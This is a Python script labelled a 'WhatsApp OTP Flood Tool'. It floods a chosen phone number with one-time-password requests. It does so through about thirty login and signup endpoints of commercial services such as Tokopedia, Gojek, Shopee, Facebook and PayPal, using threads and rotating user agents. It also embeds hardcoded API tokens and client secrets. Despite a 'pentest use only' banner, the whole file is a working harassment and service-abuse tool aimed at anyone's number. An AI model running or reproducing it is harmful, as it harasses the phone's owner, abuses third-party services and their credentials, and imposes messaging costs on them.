#!/usr/bin/env python3
import requests, json, threading, time, sys, random, os
from concurrent.futures import ThreadPoolExecutor

UA = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S906E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
]

PROVIDERS = []

PROVIDERS.append(("Tokopedia", "https://api.tokopedia.com/graphql", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.tokopedia.com"},
    lambda p: {"operationName": "sendLoginOtp", "variables": {"phoneNumber": p}, "query": "mutation sendLoginOtp($phoneNumber: String!) { sendLoginOtp(phoneNumber: $phoneNumber) { success message } }"}
))

PROVIDERS.append(("Matahari", "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", "POST",
    lambda: {"content-type": "application/json", "x-requested-with": "XMLHttpRequest", "origin": "https://www.matahari.com"},
    lambda p: {"otp_request": {"mobile_number": p.lstrip("+62"), "mobile_country_code": "+62"}}
))

PROVIDERS.append(("Carsome", "https://www.carsome.id/website/login/sendSMS", "POST",
    lambda: {"content-type": "application/json", "x-language": "id", "origin": "https://www.carsome.id"},
    lambda p: {"username": p.lstrip("+62"), "optType": 1}
))

PROVIDERS.append(("Ruparupa", "https://wapi.ruparupa.com/auth/generate-otp", "POST",
    lambda: {"content-type": "application/json",
             "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs",
             "origin": "https://m.ruparupa.com"},
    lambda p: {"phone": p.lstrip("+62"), "action": "register", "channel": "chat", "email": "", "token": "", "customer_id": "0", "is_resend": 0}
))

PROVIDERS.append(("BukuWarung", "https://api-v2.bukuwarung.com/api/v2/auth/otp/send", "POST",
    lambda: {"content-type": "application/json", "buku-origin": "tokoko-web", "origin": "https://tokoko.id"},
    lambda p: {"action": "LOGIN_OTP", "countryCode": "+62", "method": "WA", "phone": p.lstrip("+62"),
               "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6", "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"}
))

PROVIDERS.append(("Tokko", "https://api.tokko.io/graphql", "POST",
    lambda: {"content-type": "application/json", "origin": "https://web.lummoshop.com"},
    lambda p: {"operationName": "generateOTP", "variables": {"generateOtpInput": {"phoneNumber": "+62"+p.lstrip("+62"), "hashCode": "", "channel": "WHATSAPP", "userType": "MERCHANT"}},
               "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) { generateOtp(generateOtpInput: $generateOtpInput) { phoneNumber } }"}
))

PROVIDERS.append(("Ginee", "https://accounts.ginee.com/api/iam-service/account/send-verification-code", "POST",
    lambda: {"content-type": "application/json", "origin": "https://accounts.ginee.com"},
    lambda p: {"account": "0"+p.lstrip("+62"), "countryCode": "ID", "verificationPurpose": "USER_REGISTRATION", "verificationType": "PHONE"}
))

PROVIDERS.append(("MisterAladin", "https://m.misteraladin.com/api/members/v2/otp/request", "POST",
    lambda: {"content-type": "application/json", "origin": "https://m.misteraladin.com", "x-platform": "mobile-web"},
    lambda p: {"phone_number_country_code": "62", "phone_number": p.lstrip("+62"), "type": "register"}
))

PROVIDERS.append(("Kredinesia", "https://api.kredinesia.id/api/v2/auth/otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.kredinesia.id"},
    lambda p: {"phone": p.lstrip("+62"), "captcha": ""}
))

PROVIDERS.append(("KlikWA", "https://api.klikwa.net/v1/number/sendotp", "POST",
    lambda: {"content-type": "application/json", "authorization": "Basic QjMzOkZSMzM="},
    lambda p: {"number": "+62"+p.lstrip("+62")}
))

PROVIDERS.append(("Gojek", "https://api.gojekapi.com/v1/customers/login/request", "POST",
    lambda: {"content-type": "application/json", "x-appid": "com.gojek.app", "x-user-type": "customer"},
    lambda p: {"phone": p.lstrip("+62"), "country_code": "+62"}
))

PROVIDERS.append(("Grab", "https://api.grab.com/grabid/v1/phone/otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.grab.com"},
    lambda p: {"phoneNumber": p, "countryCode": "ID"}
))

PROVIDERS.append(("Shopee", "https://shopee.co.id/api/v2/authentication/send_otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://shopee.co.id", "x-requested-with": "XMLHttpRequest"},
    lambda p: {"phone": p.lstrip("+62")}
))

PROVIDERS.append(("Dana", "https://api.dana.id/account/v1/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.dana.id"},
    lambda p: {"phoneNumber": p.lstrip("+62")}
))

PROVIDERS.append(("OVO", "https://api.ovo.id/v1.0/auth/send-otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.ovo.id"},
    lambda p: {"phone": p.lstrip("+62")}
))

PROVIDERS.append(("LinkAja", "https://api.linkaja.com/v1/auth/otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.linkaja.id"},
    lambda p: {"msisdn": p.lstrip("+62")}
))

PROVIDERS.append(("Blibli", "https://www.blibli.com/backend/auth/v2/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.blibli.com"},
    lambda p: {"phoneNumber": p.lstrip("+62")}
))

PROVIDERS.append(("Traveloka", "https://api.traveloka.com/v3/auth/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.traveloka.com"},
    lambda p: {"phoneNumber": p}
))

PROVIDERS.append(("Tiket.com", "https://api.tiket.com/v1/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.tiket.com"},
    lambda p: {"phone": p}
))

PROVIDERS.append(("Bukalapak", "https://www.bukalapak.com/auth/otp", "POST",
    lambda: {"content-type": "application/json", "x-requested-with": "XMLHttpRequest", "origin": "https://www.bukalapak.com"},
    lambda p: {"phone": p}
))

PROVIDERS.append(("Uber", "https://www.uber.com/api/send-otp", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.uber.com"},
    lambda p: {"phone": p}
))

PROVIDERS.append(("Facebook", "https://www.facebook.com/api/graphql/", "POST",
    lambda: {"content-type": "application/x-www-form-urlencoded"},
    lambda p: {"av": "0", "fb_api_req_friendly_name": "CometUserAccountValidationPhoneSendCodeMutation",
               "variables": json.dumps({"phone": p, "country_code": "US"}), "doc_id": "7472496992387614"}
))

PROVIDERS.append(("LinkedIn", "https://www.linkedin.com/auth/lg/otp/send-otp", "POST",
    lambda: {"content-type": "application/json", "csrf-token": "ajax:1234567890", "origin": "https://www.linkedin.com"},
    lambda p: {"phoneNumber": p, "source": "login"}
))

PROVIDERS.append(("Twitter/X", "https://api.twitter.com/1.1/onboarding/task.json", "POST",
    lambda: {"content-type": "application/json",
             "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
             "origin": "https://twitter.com"},
    lambda p: {"flow_name": "signup", "params": {"phone_number": p}}
))

PROVIDERS.append(("Amazon", "https://www.amazon.com/ap/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.amazon.com"},
    lambda p: {"phoneNumber": p, "source": "signin"}
))

PROVIDERS.append(("PayPal", "https://www.paypal.com/signup/account/phone/otp/send", "POST",
    lambda: {"content-type": "application/json", "origin": "https://www.paypal.com"},
    lambda p: {"phone": {"nationalNumber": p}, "source": "signup"}
))

PROVIDERS.append(("Telegram", "https://my.telegram.org/auth/send_password", "POST",
    lambda: {"content-type": "application/json", "origin": "https://my.telegram.org"},
    lambda p: {"phone": p}
))

PROVIDERS.append(("MPL", "https://global-api.mpl.live/auth/init/otp", "POST",
    lambda: {"content-type": "application/json", "language": "in", "user-agent": "mpl-android/1000153 (RV-153)", "apptype": "ANDROID"},
    lambda p: {"phone": p.lstrip("+62"), "country_code": "62"}
))


class OTPFlooder:
    def __init__(self, target, threads=10, delay=0.5):
        self.target = target if target.startswith("+") else "+" + target
        self.threads = threads
        self.delay = delay
        self.sent = 0
        self.failed = 0
        self.running = True
        self.lock = threading.Lock()
        self.start_time = None

    def _send(self, provider):
        if not self.running:
            return
        name, url, method, hfunc, pfunc = provider
        try:
            headers = hfunc()
            headers["user-agent"] = random.choice(UA)
            headers.setdefault("accept-language", "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7")
            payload = pfunc(self.target)
            if method == "POST":
                r = requests.post(url, json=payload, headers=headers, timeout=10)
            else:
                r = requests.get(url, params=payload, headers=headers, timeout=10)
            ok = 200 <= r.status_code < 300 or r.status_code in (400, 429, 401, 403)
            with self.lock:
                if ok:
                    self.sent += 1
                else:
                    self.failed += 1
        except Exception:
            with self.lock:
                self.failed += 1

    def _worker(self, provider):
        while self.running:
            self._send(provider)
            time.sleep(self.delay + random.uniform(0, 0.5))

    def start(self, duration=None):
        self.start_time = time.time()
        print(f"\n{'='*55}")
        print(f"  OTP Flood Attack Started")
        print(f"  Target  : {self.target}")
        print(f"  Workers : {self.threads}")
        print(f"  Providers: {len(PROVIDERS)}")
        if duration:
            print(f"  Duration: {duration}s")
        print(f"{'='*55}\n")
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = [pool.submit(self._worker, p) for p in PROVIDERS]
            try:
                while self.running:
                    time.sleep(2)
                    elapsed = time.time() - self.start_time
                    rate = self.sent / (elapsed + 0.01)
                    sys.stdout.write(f"\r  [{time.strftime('%H:%M:%S')}] Sent: {self.sent:5d} | Failed: {self.failed:5d} | Rate: {rate:.1f}/s | Elapsed: {int(elapsed)}s   ")
                    sys.stdout.flush()
                    if duration and elapsed >= duration:
                        self.running = False
                        break
            except KeyboardInterrupt:
                self.running = False
                print("\n\n[!] Stopped by user.")
        elapsed = time.time() - self.start_time
        print(f"\n\n{'='*55}")
        print(f"  Complete — {int(elapsed)}s elapsed")
        print(f"  Sent   : {self.sent}")
        print(f"  Failed : {self.failed}")
        print(f"  Avg    : {self.sent/(elapsed+0.01):.1f} req/s")
        print(f"{'='*55}\n")


if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print("""
  ========================================
    WhatsApp OTP Flood Tool
    Authorized Pentest Use Only
  ========================================
    """)
    target = input("Target number (e.g., 628123456789): ").strip()
    threads = input("Threads [default=10]: ").strip()
    threads = int(threads) if threads.isdigit() else 10
    delay = input("Delay (seconds) [default=0.5]: ").strip()
    delay = float(delay) if delay else 0.5
    dur = input("Duration in seconds [default=unlimited]: ").strip()
    duration = int(dur) if dur.isdigit() else None
    flooder = OTPFlooder(target, threads=threads, delay=delay)
    flooder.start(duration=duration)